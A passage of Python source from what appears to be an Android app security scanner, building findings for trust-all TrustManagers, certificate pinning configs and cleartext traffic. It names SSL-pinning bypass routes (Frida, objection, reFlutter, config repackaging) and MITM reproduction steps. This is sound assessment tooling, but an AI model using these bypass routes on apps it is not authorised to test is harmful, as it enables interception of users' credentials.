            "title": "Disabled TLS validation (trust-all TrustManager)",
            "severity": "high", "category": "ssl",
            "location": java_name,
            "evidence": java_name + ".checkServerTrusted() is empty",
            "description": "This class implements X509TrustManager with an EMPTY "
                           "checkServerTrusted() — it accepts ANY certificate.",
            "risk": "TLS validation is disabled on any connection using this TrustManager: "
                    "a network attacker (rogue Wi-Fi, proxy) can silently MITM the traffic, "
                    "reading and modifying credentials/session data. This is a vulnerability, "
                    "not pinning.",
            "reproduce": ["Route the app through Burp/mitmproxy with an untrusted CA.",
                          "Observe that requests via this client succeed despite the bad cert."],
            "mitigation": "Never return without validating in checkServerTrusted(); use the "
                          "platform default TrustManager and add pinning on top if needed. "
                          "Remove debug/test trust-all managers from release builds.",
            "masvs": "MASVS-NETWORK-1"})

    if has_pin:
        ssl.append({"id": "network-security-config",
                    "name": "Network Security Config <pin-set>", "category": "ssl",
                    "layer": "config", "confidence": "high",
                    "desc": "Declarative pinning in res/xml network security config.",
                    "evidence": "res/xml network_security_config <pin-set>",
                    "guides": ["nsc-repack", "frida-ssl-universal", "objection-ssl-android"],
                    "config_snippet": snippet})

    notes = []
    if cleartext:
        notes.append("Network Security Config permits cleartext traffic (cleartextTrafficPermitted=true).")
    for fw in frameworks:
        if fw["id"] == "flutter":
            notes.append("Flutter detected: SSL pinning bypass requires reFlutter or a "
                         "libflutter.so native hook — standard Java/objection hooks will NOT work.")

    return {
        "root": {"implemented": len(root) > 0, "layers": len(root), "mechanisms": root},
        "ssl": {"implemented": len(ssl) > 0, "layers": len(ssl), "mechanisms": ssl},
        "vulns": vulns,
        "auth": auth_findings,
        "misc": misc,
        "frameworks": frameworks,
        "notes": notes,
        "obfuscation": obf,
        "discovered": discovered,
        "cleartext": cleartext,
    }
